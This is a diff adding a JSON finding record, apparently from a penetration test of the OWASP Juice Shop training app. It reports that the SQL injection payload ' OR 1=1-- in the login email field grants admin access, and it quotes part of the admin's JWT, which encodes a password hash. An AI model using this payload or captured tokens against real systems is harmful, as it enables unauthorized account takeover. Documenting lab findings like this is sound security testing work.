@@ -1,0 +1,6 @@
+{
+  "fact_key": "sql_injection_login",
+  "summary": "SQL injection in login - authenticated as admin",
+  "body": "Using email: ' OR 1=1-- (any password) in POST /rest/user/login resulted in successful authentication as admin@juice-sh.op (user id 1, admin role). Response included JWT token for admin user.\nProof: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIi...,\"umail\":\"admin@juice-sh.op\"}}",
+  "updated_at": "2026-07-23T20:09:21.094Z"
+}
